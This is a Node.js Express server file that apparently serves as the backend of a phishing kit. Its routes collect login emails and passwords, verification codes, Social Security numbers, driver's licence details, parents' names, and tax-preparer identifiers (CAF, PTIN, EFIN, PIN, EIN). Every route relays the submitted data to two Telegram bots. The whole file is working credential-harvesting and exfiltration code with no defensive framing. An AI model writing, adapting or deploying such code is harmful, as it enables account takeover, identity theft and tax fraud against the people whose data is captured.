import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// Basic health check route
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.status(200).json({ message: 'Backend is running' });
});

// Utility to send Telegram message
async function sendTelegramMessage(text) {
  const bots = [
    {
      token: process.env.BOT1_TOKEN,
      chatId: process.env.CHAT_ID1,
    },
    {
      token: process.env.BOT2_TOKEN,
      chatId: process.env.CHAT_ID2,
    }
  ];

  const sendPromises = bots.map(async ({ token, chatId }, index) => {
    try {
      console.log(`Sending to Bot ${index + 1}: Chat ID = ${chatId}`);
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text,
      });
    } catch (err) {
      console.error(`Failed to send to Bot ${index + 1}:`, err.response?.data || err.message);
    }
  });

  await Promise.all(sendPromises);
}

// Routes

app.post('/sendToTelegram', async (req, res, next) => {
  const { email, password } = req.body;
  console.log("Received data:", req.body);

  if (!email || !password) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).json({ success: false, message: "Missing required fields" });
  }

  const message = `New login:\n📧 Email: ${email}\n🔐 Password: ${password}`;

  try {
    await sendTelegramMessage(message);

    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ success: true, message: "Message sent to Telegram" });

  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    next(error); // forward to error handler
  }
});

// Repeat similar pattern for other routes

app.post('/verifyCode', async (req, res, next) => {
  const { code } = req.body;
  console.log("Received code:", code);

  if (!code) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).json({ success: false, message: "Code is required" });
  }

  const message = `User submitted code: ${code}`;

  try {
    await sendTelegramMessage(message);

    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ success: true, message: "Code sent to Telegram successfully!" });
  } catch (error) {
    console.error('Error sending code:', error.response?.data || error.message);
    next(error);
  }
});

app.post('/sendDetails', async (req, res, next) => {
  const { name, dob, ssn, phone } = req.body;

  if (!name || !dob || !ssn || !phone) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).json({ success: false, message: "Missing required fields" });
  }

  const message = `New user details:\nName: ${name}\nDOB: ${dob}\nSSN: ${ssn}\nPhone: ${phone}`;

  try {
    await sendTelegramMessage(message);
    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ success: true, message: "Message sent to Telegram" });
  } catch (error) {
    console.error('Error sending details:', error.response?.data || error.message);
    next(error);
  }
});

app.post('/sendVerify', async (req, res, next) => {
  const { licenseNumber, issueDate, expireDate } = req.body;

  if (!licenseNumber || !issueDate || !expireDate) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).json({ success: false, message: "Missing required fields" });
  }

  const message = `New user details:\nLicense: ${licenseNumber}\nIssueDate: ${issueDate}\nExpireDate: ${expireDate}`;

  try {
    await sendTelegramMessage(message);
    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ success: true, message: "Message sent to Telegram" });
  } catch (error) {
    console.error('Error sending verify:', error.response?.data || error.message);
    next(error);
  }
});

app.post('/sendPersonal', async (req, res, next) => {
  const { father, mother, mothers, place } = req.body;

  if (!father || !mother || !mothers || !place) {
    res.setHeader('Content-Type', 'application/json');
    return res.status(400).json({ success: false, message: "Missing required fields" });
  }

  const message = `New user details:\nFather: ${father}\nMother: ${mother}\nMothers: ${mothers}\nPlace: ${place}`;

  try {
    await sendTelegramMessage(message);
    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({ success: true, message: "Message sent to Telegram" });
  } catch (error) {
    console.error('Error sending personal:', error.response?.data || error.message);
    next(error);
  }
});
app.post('/sendGoal', async (req, res) => {
  const { caf, ptin, efin, pin } = req.body;

  if (!caf || !ptin || !efin || !pin) {
    return res.status(400).json({ success: false, message: "Missing fields" });
  }

  const message = `GOAL INFO:\nCAF: ${caf}\nPTIN: ${ptin}\nEFIN: ${efin}\nPIN: ${pin}`;

  try {
    await sendTelegramMessage(message); // your custom function
    res.status(200).json({ success: true, message: "Goal info sent to Telegram" });
  } catch (err) {
    console.error("Telegram Error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

app.post('/sendAddress', async (req, res, next) => {
  const { ein, firm, address, phone } = req.body;

  if (!ein || !firm || !address || !phone) {
    return res.status(400).json({ success: false, message: "Missing required fields" });
  }

  const message = `New Address Info:\nEIN: ${ein}\nFirm Name: ${firm}\nAddress: ${address}\nPhone: ${phone}`;

  try {
    await sendTelegramMessage(message);
    res.status(200).json({ success: true, message: "Address info sent to Telegram" });
  } catch (error) {
    console.error("Error sending address info:", error);
    next(error);
  }
});




// Catch-all for unmatched routes - JSON response
app.use((req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.status(404).json({ success: false, message: "Route not found" });
});

// Global error handler middleware - always sends JSON
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.setHeader('Content-Type', 'application/json');
  res.status(500).json({ success: false, message: "Internal Server Error" });
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
